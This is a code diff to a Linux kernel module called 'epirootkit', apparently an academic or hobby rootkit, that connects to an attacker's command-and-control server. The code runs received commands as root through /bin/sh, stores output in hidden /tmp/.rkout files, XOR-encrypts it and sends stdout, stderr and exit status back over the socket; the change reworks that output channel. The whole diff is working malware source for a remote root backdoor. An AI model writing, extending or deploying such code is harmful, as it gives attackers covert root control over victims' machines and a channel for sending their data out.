@@ -24,6 +24,8 @@ MODULE_VERSION("0.3");
 #define PASSWORD_LEN 6
 #define MAX_CMD_LEN 512
 #define EOF_MARKER "--EOF--"
+#define SEP_STDERR "--STDERR--"
+#define SEP_STATUS "--STATUS--"
 
 static struct socket *g_sock = NULL;
 static struct task_struct *g_conn_thread = NULL;
@@ -39,10 +41,7 @@ MODULE_PARM_DESC(server_port, "Attacker server port");
 static void notify_connection_state(int new_state) {
     if (new_state != connection_state) {
         connection_state = new_state;
-        if (connection_state)
-            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
-        else
-            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
+        printk(KERN_INFO "epirootkit: %s to C2 server\n", connection_state ? "Connected" : "Disconnected");
     }
 }
 
@@ -116,35 +115,43 @@ static int rootkit_thread_fn(void *data) {
 
             char tmp_path[] = "/tmp/.rkout";
             char shell_cmd[512];
-            snprintf(shell_cmd, sizeof(shell_cmd), "cd / && %s > %s 2>&1", cmd_buf, tmp_path);
+            snprintf(shell_cmd, sizeof(shell_cmd), "%s 1>%s.stdout 2>%s.stderr; echo $? > %s.status", cmd_buf, tmp_path, tmp_path, tmp_path);
 
             mm_segment_t old_fs = get_fs();
             set_fs(KERNEL_DS);
             call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", shell_cmd, NULL}, NULL, UMH_WAIT_PROC);
             set_fs(old_fs);
 
-            struct file *file = filp_open(tmp_path, O_RDONLY, 0);
-            if (!IS_ERR(file)) {
-                char io_buf[256];
-                loff_t pos = 0;
-                while (1) {
-                    memset(io_buf, 0, sizeof(io_buf));
-                    int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
-                    if (r <= 0) break;
-                    pos += r;
-                    xor_encrypt(io_buf, r);
-                    struct kvec ciov = {.iov_base = io_buf, .iov_len = r};
-                    struct msghdr cmsg = {0};
-                    kernel_sendmsg(g_sock, &cmsg, &ciov, 1, ciov.iov_len);
+            char *paths[] = { ".rkout.stdout", ".rkout.stderr", ".rkout.status" };
+            char *seps[] = { SEP_STDERR, SEP_STATUS, EOF_MARKER };
+            for (int i = 0; i < 3; ++i) {
+                char full_path[64];
+                snprintf(full_path, sizeof(full_path), "/tmp/%s", paths[i]);
+                struct file *file = filp_open(full_path, O_RDONLY, 0);
+                if (!IS_ERR(file)) {
+                    char io_buf[256];
+                    loff_t pos = 0;
+                    while (1) {
+                        memset(io_buf, 0, sizeof(io_buf));
+                        int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
+                        if (r <= 0) break;
+                        pos += r;
+                        xor_encrypt(io_buf, r);
+                        struct kvec ciov = {.iov_base = io_buf, .iov_len = r};
+                        struct msghdr cmsg = {0};
+                        kernel_sendmsg(g_sock, &cmsg, &ciov, 1, ciov.iov_len);
+                    }
+                    filp_close(file, NULL);
                 }
-                filp_close(file, NULL);
+                if (i < 3) {
+                    char mark[32];
+                    snprintf(mark, sizeof(mark), "%s", seps[i]);
+                    xor_encrypt(mark, strlen(mark));
+                    struct kvec miov = {.iov_base = mark, .iov_len = strlen(mark)};
+                    struct msghdr mmsg = {0};
+                    kernel_sendmsg(g_sock, &mmsg, &miov, 1, miov.iov_len);
+                }
             }
-
-            char eof[] = EOF_MARKER;
-            xor_encrypt(eof, sizeof(eof) - 1);
-            struct kvec eiov = {.iov_base = eof, .iov_len = sizeof(eof) - 1};
-            struct msghdr emsg = {0};
-            kernel_sendmsg(g_sock, &emsg, &eiov, 1, eiov.iov_len);
         }
 
         break;
